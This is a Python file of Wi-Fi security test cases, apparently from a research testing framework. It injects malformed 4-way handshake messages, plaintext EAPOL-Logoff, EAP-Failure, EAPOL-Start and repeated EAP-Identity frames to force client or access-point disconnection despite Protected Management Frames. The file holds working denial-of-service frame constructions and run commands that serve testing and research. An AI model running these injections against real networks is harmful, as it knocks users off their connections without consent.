# Import dependencies and libraries.
from dependencies.libwifi.wifi import *
from library.testcase import Trigger, Action, Test
from scapy.contrib.wpa_eapol import WPA_key

# -------------------------------------------------------------------------------------
# --- 4-Way Handshake -----------------------------------------------------------------
# -------------------------------------------------------------------------------------

class PMFDeauthClientPMKIDTagLength(Test):
	"""Deauthentication using invalid PMKID Tag Length in 4-Way Handshake 1/4."""
	name = "pmf-deauth-pmkid-tag-length"
	kind = Test.Authenticator
	
	# Notes:
	# - The EAPoL Key Descriptor needs to match the original 4-Way Handshake 1/4:
	#   For other network configurations, you might need to change byte 0x88 of
	#   the EAPoL-frame to the approratie value. For WPA2-Personal-PMF: 0x8a.
	# - Attack in fact works with an underflow in any tag, not just the PMKID.
	
	# Instructions:
	# cd setup; ./load-config.sh wpa3-personal-pmf
	# clear; ./run.py wlxa42bb0bc6474 pmf-deauth-pmkid-tag-length
	# clear; ./hostap.py wlxf4ec3890acdc
	
	def __init__(self):
		super().__init__([
			# Inject a Malformed 4-Way Handshake Message 1/4.
			Action( trigger=Trigger.Connected, action=Action.Inject ),
			# If the station disconnects, we can succcessfully terminate the test.
			Action( trigger=Trigger.Disconnected, action=Action.Terminate )
		])
		
	def generate(self, station):
		frame = station.get_header() # Returns Dot11QoS()-header.
		# Generate a malformed 4-Way Handshake Message 1/4.
		eapol = ("0203007502"
			"0088" # Key Information.
			"001000000000000000" 
			"05" # Replay Counter (Increased).
			"00000000000000000000000000000000" 
			"00000000000000000000000000000000" 
			"00000000000000000000000000000000" 
			"00000000000000000000000000000000" 
			"00000000000000000000000000000000" 
			"0016" # WPA Key Data Length.
			"dd" # RSN PMKID Tag Number.
			"ff" # RSN PMKID Tag Length (Corrupted).
			"000fac04" 
			"00000000000000000000000000000000") # PMKID.
		frame /= LLC()/SNAP()/EAPOL(bytes.fromhex(eapol))
		self.actions[0].set_frame( frame , encrypt=False , mon=True )
		self.actions[0].set_delay( 3 )

class PMFDeauthClientBadMsg1(Test):
	"""Inject a 4-way message 1 frame that also has the Install flag set."""
	name = "pmf-deauth-bad-msg1"
	kind = Test.Authenticator

	# Instructions:
	# cd setup; ./load-config.sh wpa3-personal-pmf
	# clear; ./run.py wlan0 pmf-deauth-bad-msg1
	# clear; ./iwd -i wlan1

	def __init__(self):
		super().__init__([
			# Inject malformed 4-Way Handshake Message 1/4
			Action( trigger=Trigger.Connected, action=Action.Inject ),
			# See if the client gets disconnected as a result
			Action( trigger=Trigger.Disconnected, action=Action.Terminate )
		])


	def build_msg1(self, station):
		# Need a replay counter that is higher than initial 4-way handshake
		self.anonce = random.randbytes(32)
		self.replay_counter = 11

		# The correct flags are 0x008a. We wrongly set the install flag, leading to 0x00ca.
		p = WPA_key(descriptor_type=2,
					key_info=0x00ca,
					replay_counter=struct.pack(">Q", self.replay_counter),
					nonce=self.anonce)
		p = LLC()/SNAP()/EAPOL(version="802.1X-2004", type="EAPOL-Key")/p
		p = station.get_header()/p

		log(STATUS, f"Created frame {repr(p)}")
		return p

	def generate(self, station):
		# Inject malformed msg1
		msg1 = self.build_msg1(station)
		self.actions[0].set_frame( msg1 )
		self.actions[0].set_delay( 2 )

# -------------------------------------------------------------------------------------
# --- Extensible Authentication Protocol ----------------------------------------------
# -------------------------------------------------------------------------------------

class PMFDeauthAPEAPOLLogoff(Test):
	"""Deauthentication using an EAPOL-Logoff."""
	name = "pmf-deauth-eapol-logoff"
	kind = Test.Supplicant
	
	# Instructions:
	# cd setup; ./load-config.sh wpa2-enterprise
	# clear; ./hostap.py wlxa42bb0bc6474 --ap
	# clear; ./run.py wlxf4ec3890acdc pmf-deauth-eapol-logoff
	
	def __init__(self):
		super().__init__([
			# Inject a plaintext EAPOL-Logoff.
			Action( trigger=Trigger.Connected, action=Action.Inject ),
			# If the station is disconnected, we can terminate the test.
			Action( trigger=Trigger.Disconnected, action=Action.Terminate )
		])
		
	def generate(self, station):
		
		# Contruct an EAPOL-Logoff.
		frame = station.get_header() # Returns Dot11QoS()-header.
		frame /= LLC()/SNAP()/EAPOL( version="802.1X-2004" , type="EAPOL-Logoff" )

		# Transmit plaintext frame, after some delay.
		self.actions[0].set_frame( frame , encrypt=False , mon=True )
		self.actions[0].set_delay( 2 )

class PMFDeauthClientEAPFailure(Test):
	"""Deauthentication using an EAP-Failure."""
	name = "pmf-deauth-eap-failure"
	kind = Test.Authenticator
	
	# Instructions:
	# cd setup; ./load-config.sh wpa2-enterprise
	# clear; ./run.py wlxa42bb0bc6474 pmf-deauth-eap-failure
	# clear; ./hostap.py wlxf4ec3890acdc
	
	def __init__(self):
		super().__init__([
			# Inject a plaintext EAP-Failure.
			Action( trigger=Trigger.Connected, action=Action.Inject ),
			# If the station is disconnected, we can terminate the test.
			Action( trigger=Trigger.Disconnected, action=Action.Terminate )
		])
		
	def generate(self, station):
		
		# Contruct an EAP-Failure.
		frame = station.get_header() # Returns Dot11QoS()-header.
		frame /= LLC()/SNAP()/EAPOL( version="802.1X-2001" )
		frame /= EAP( code="Failure" )

		# Transmit plaintext frame, after some delay.
		self.actions[0].set_frame( frame , encrypt=False , mon=True )
		self.actions[0].set_delay( 2 )

class PMFDeauthClientEAPRounds(Test):
	"""Deauthentication using an excessive number of EAP Rounds."""
	name = "pmf-deauth-eap-rounds"
	kind = Test.Authenticator
	
	# Instructions:
	# cd setup; ./load-config.sh wpa2-enterprise
	# clear; ./run.py wlxa42bb0bc6474 pmf-deauth-eap-rounds
	# clear; ./hostap.py wlxf4ec3890acdc
	
	def __init__(self):
		super().__init__([
			# Dummy Action to trigger testcase.
			Action( trigger=Trigger.Connected, action=Action.NoAction ),
			#
			# Inject plaintext EAP-Identity-Requests.
			# NOTE: MORE ACTIONS INSERTED AT RUNTIME FOR KEEPING THIS SHORT.
			#
			# If the station is disconnected, we can terminate the test.
			Action( trigger=Trigger.Disconnected, action=Action.Terminate )
		])
		
	def generate(self, station):
		self.actions[0].set_delay( 2 )
		
		# Contruct an EAP-Identity-Request.
		frame = station.get_header() # Returns Dot11QoS()-header.
		frame /= LLC()/SNAP()/EAPOL( version="802.1X-2001" )
		frame /= EAP( code="Request" , type="Identity" , id=1 )

		# Construct an Action.
		action = Action( trigger=Trigger.Connected, action=Action.Inject )
		action.set_frame( frame , encrypt=False , mon=True )
		action.set_delay( 0.1 )
				
		# Add all Actions to repeatedly sent the EAP-Identity-Request.
		for _ in range(70):
			self.actions.insert(1,action)
			
class PMFDeauthAPEAPOLStart(Test):
	"""Deauthentication using EAPOL-Starts."""
	name = "pmf-deauth-eapol-start"
	kind = Test.Supplicant
	
	# Instructions:
	# cd setup; ./load-config.sh wpa2-enterprise
	# clear; ./hostap.py wlxa42bb0bc6474 --ap
	# clear; ./run.py wlxf4ec3890acdc pmf-deauth-eapol-start
	
	def __init__(self):
		super().__init__([
			# Inject plaintext EAPOL-Start.
			Action( trigger=Trigger.Connected, action=Action.Inject ),
			Action( trigger=Trigger.Connected, action=Action.Inject ),
			Action( trigger=Trigger.Connected, action=Action.Inject ),
			# If the station is disconnected, we can terminate the test.
			Action( trigger=Trigger.Disconnected, action=Action.Terminate )
		])
		
	def generate(self, station):
		
		# Contruct an EAP-Identity-Request.
		frame = station.get_header() # Returns Dot11QoS()-header.
		frame /= LLC()/SNAP()/EAPOL( version="802.1X-2001" , type="EAPOL-Start" )

		# Transmit plaintext frames, after some delay.
		self.actions[0].set_delay( 2 )
		self.actions[0].set_frame( frame , encrypt=False , mon=True )
		self.actions[1].set_frame( frame , encrypt=False , mon=True )
		self.actions[2].set_frame( frame , encrypt=False , mon=True )
